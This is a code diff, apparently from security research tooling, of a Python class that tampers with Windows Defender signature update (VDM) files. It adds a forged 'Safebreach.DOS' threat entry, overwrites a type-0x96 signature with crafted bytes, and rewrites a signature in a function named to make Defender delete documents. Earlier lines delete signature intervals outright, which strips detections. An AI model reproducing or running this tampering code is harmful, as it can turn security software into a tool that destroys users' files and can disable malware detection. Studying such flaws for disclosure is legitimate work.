@@ -35,8 +35,8 @@ class VdmPair:
 
         deleter.run()
         
-        begin = ThreatBegin(id=0x133, category=34, name=b"Safebreach.DOS", footer=b'\x70\x00\x04\x00')
-        end = ThreatEnd(_id=0x133)
+        begin = ThreatBegin(id=0x337, category=34, name=b"Safebreach.DOS", footer=b'\x70\x00\x04\x00')
+        end = ThreatEnd(_id=0x337)
         dos_threat = Threat()
         dos_threat.begin = begin
         dos_threat.end = end
@@ -46,7 +46,7 @@ class VdmPair:
         dos_threat.push(dos_hstr)
        
         AddThreat(self, dos_threat).run()
-        self.finallize_blob()
+        #self.finallize_blob()
 
     def delete_test(self):
         threats = Merger(self.basevdm, self.deltavdm).merge()
@@ -54,7 +54,6 @@ class VdmPair:
         stream.seek(0)
         target = None
 
-        deleter = DeleteIntervals(self, [])
 
         while True:
             signature = Signature.read_one(stream)
@@ -62,21 +61,17 @@ class VdmPair:
             if not signature:
                 break
             
-            if signature.type == 0xbd:#0x96:
-                if signature.name in ['LuaFuncHelper', 'TechniqueTracker', 'BMLuaLib']:
-                    continue
+            if signature.type == 0x96:
+                target = signature
                 logging.info(signature.__str__())
-                deleter.add(signature.interval)
-        
-        deleter.run()
-        self.finallize_blob()
+                break
 
-        # if target:
-        #     logging.info("Starting modification ...")
-        #     new_data = b'\x96\x2a\x00\x00\x00\x00\x26\x00\x53\x49\x47\x41\x54\x54\x52\x3a\x4d\x6f\x6e\x69\x74\x6f\x72\x69\x6e\x67\x54\x6f\x6f\x6c\x3a\x57\x69\x6e\x33\x32\x2f\x41\x63\x74\x75\x61\x6c\x53\x78\x78'
-        #     logging.info(new_data)
-        #     ModifyInterval(self, signature.interval, new_data).run()
-        #     self.finallize_blob()
+        if target:
+            logging.info("Starting modification ...")
+            new_data = b'\x96\x1f\x00\x00\x00\x00\x1b\x00\x21\x23\x4c\x75\x61\x3a\x44\x6c\x6c\x53\x75\x73\x70\x69\x63\x69\x6f\x75\x73\x45\x78\x70\x6f\x72\x74\x2e\x41'
+            logging.info(new_data)
+            ModifyInterval(self, signature.interval, new_data).run()
+            self.finallize_blob()
         
     def modify_specific_signature_to_delete_documetns(self):
         threats = Merger(self.basevdm, self.deltavdm).merge()
@@ -92,7 +87,7 @@ class VdmPair:
             brute_interval += target.begin.interval.end
             brute_interval.start = brute_interval.start - 5
             
-            ModifyInterval(self, brute_interval, b'\x83\x59\x00\x04\x00\x29\x11\x00\x00\x00\x00\x00\xff\xff\xff\xff\x06\x00\x00\x00\x3f\x78\x6d\x6c\x90\x00').run()
+            ModifyInterval(self, brute_interval, b'\x96\x1d\x00\x00\x00\x00\x19\x00\x4c\x75\x61\x3a\x44\x6c\x6c\x53\x75\x73\x70\x69\x63\x69\x6f\x75\x73\x45\x78\x70\x6f\x72\x74\x2e\x41').run()
             
         self.finallize_blob()
 
